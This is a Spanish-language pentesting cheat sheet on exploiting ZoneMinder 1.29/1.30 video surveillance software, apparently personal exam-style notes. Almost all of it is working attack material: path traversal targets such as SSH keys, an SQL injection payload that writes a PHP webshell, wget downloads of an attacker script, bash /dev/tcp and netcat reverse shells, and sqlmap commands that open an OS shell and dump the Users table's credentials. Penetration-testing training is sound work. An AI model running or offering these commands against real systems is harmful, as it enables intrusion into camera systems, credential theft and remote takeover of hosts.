# Zone Minder 

Tags: #ZoneMinder

**ZoneMinder** es un **Video Management System (VMS)** o **Network Video Recorder (NVR)**. Su función es administrar un sistema de videovigilancia desde una interfaz web.
## Versión 1.29 - Path Traversal 

[LFI - Path Traversaal](https://seclists.org/fulldisclosure/2017/Feb/11)

```bash 
# Rutas en el Path Traversal 

- /etc/passwd
- /home/user/.ssh/id_rsa 
- /etc/zm/zm.conf
```

## Version 1.29/1.30 - Inyección SQL (WebShell)

```bash 
- http://IP/zm/index.php       # Zone Minder Console 

Forma de explotar:
	1. Ir a la parte de 'log'
	2. http://IP/zm/index.php?view=log    # Capturar con Burpsuite 
	3. Buscar en BurpSuite una petición POST con los siguientes campos:
		view=request&request=log&task=query&limit=100&minTime=17846...

# Payload para crear la webshell 
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"

# Hacerlo de la siguiente manera en la petición POST
view=request&request=log&task=query&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"#&minTime=17846...

NOTA:
	- La webshell aparecerá en el directorio que esté sirviendo Apache (o el servidor web), independientemente del puerto. El puerto solo determina cómo accedes a ella. En este caso Apache esta corriendo en el puerto 3305

# Ejecutar comandos desde la web:
❯ http://192.168.249.52:3305/webshell.php?cmd=id
# Mirar el id

❯ http://192.168.249.52:3305/webshell.php?cmd=wget http://TU_IP/shell.sh -O /tmp/shell.sh
❯ http://192.168.249.52:3305/webshell.php?cmd=/bin/bash /tmp/shell.sh
# Crear la Revershell 

# En Kali 
❯ nc -nlvp 4444    # Recibir la revershell 
```

```bash 
# Contenido de shell.sh 

#!/bin/bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

## Version 1.29/1.30 - Inyección SQL y SQLMap

[Inyección SQL](https://www.exploit-db.com/exploits/41239)

```bash 
- http://IP/zm/index.php       # Zone Minder Console 

Forma de explotar:
	1. Ir a la parte de 'log'
	2. http://IP/zm/index.php?view=log    # Capturar con Burpsuite 
	3. Buscar en BurpSuite una petición POST con los siguientes campos:
		view=request&request=log&task=query&limit=100&minTime=17846...
	4. Copiar la petición POST en un archivo llamado 'request.txt' para usarlo con 'SQLMap'
```

```bash 
# Usar SQLMap 

Paso 1.1:
❯ sqlmap -r request.txt -p limit    # Detectar la vulnerabilidad  
	# p = Parámetro vulnerable visto en la petición anterior 

Paso 1.2: Conocer si es DBA
❯ sqlmap -r request.txt -p limit --current-user 
❯ sqlmap -r request.txt -p limit --is-dba 
❯ sqlmap -r request.txt -p limit --privileges

	Si el resultado es: 
	- current user: root@localhost
	- is DBA: True


Paso 1.3:
❯ sqlmap -r request.txt -p limit --os-cmd="id"  # Ejecutar un comando simple
❯ sqlmap -r request.txt -p limit --os-shell     # Abrir una shell 

# Obtener la revershell dentro de 'os-shell'
	os-shell❯ ping -c 1 IP
	os-shell❯ which bash
	os-shell❯ /bin/bash -c "bash -i >& /dev/tcp/192.168.45.161/4444 0>&1" >/dev/null 2>&1 &

# Obtener la revershell fuera de 'os-shell'
❯ sqlmap -r request.txt -p limit --os-cmd='bash -c "bash -i >& /dev/tcp/192.168.45.161/4444 0>&1"'

-------  ++++  -------
# Si no funciona, hacerlo con Netcat 

Paso 2.1:
# Levantar u server con Kali y compartir el Netcat 

Paso 2.2:
# Descargar netcat la máquina víctima 
	os-shell❯ wget http://192.168.45.161/nc -O /tmp/nc
	os-shell❯ curl http://192.168.45.161/nc -o /tmp/nc
	
	os-shell❯ chmod +x /tmp/nc
	os-shell❯ /tmp/nc -lvnp 4444 -e /bin/bash

Paso 2.3:
❯ nc -nlvp 4444   # Obtener la Revershell 
```

```bash 
Paso 1.4: Solo en caso de no ser DBA
❯ sqlmap -r request.txt -p limit --dbs 
# Obtener las DBs existentes
   
❯ sqlmap -r request.txt -p limit -D zm --tables   
# Obtener las tablas de la DB

❯ sqlmap -r request.txt -p limit -D zm -T Users --columns 
# Obtener las columnas de la tabla 

❯ sqlmap -r request.txt -p limit -D zm -T Users --dump

❯ sqlmap -r request.txt -p limit -D zm -C username,password --dump 
# Obtener la info de las columnas 
```

